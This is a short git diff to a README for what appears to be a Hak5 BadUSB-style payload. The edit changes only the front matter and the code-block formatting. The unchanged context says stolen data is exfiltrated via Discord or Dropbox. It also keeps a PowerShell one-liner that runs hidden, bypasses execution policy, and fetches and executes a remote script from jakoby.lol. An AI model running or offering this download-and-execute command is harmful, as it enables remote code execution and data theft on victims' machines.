@@ -1,3 +1,5 @@
+---
+---
 ![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)
 
 <!-- TABLE OF CONTENTS -->
@@ -39,9 +41,9 @@ They are then exfiled using either Discord or Dropbox.
 
 SYNTAX:
 
-```
+<pre><code>
 powershell -w h -ep bypass $dc='';$db='';irm https://jakoby.lol/hgw | iex
-```
+</code></pre>
 
 <!-- CONTACT -->
 ## Contact
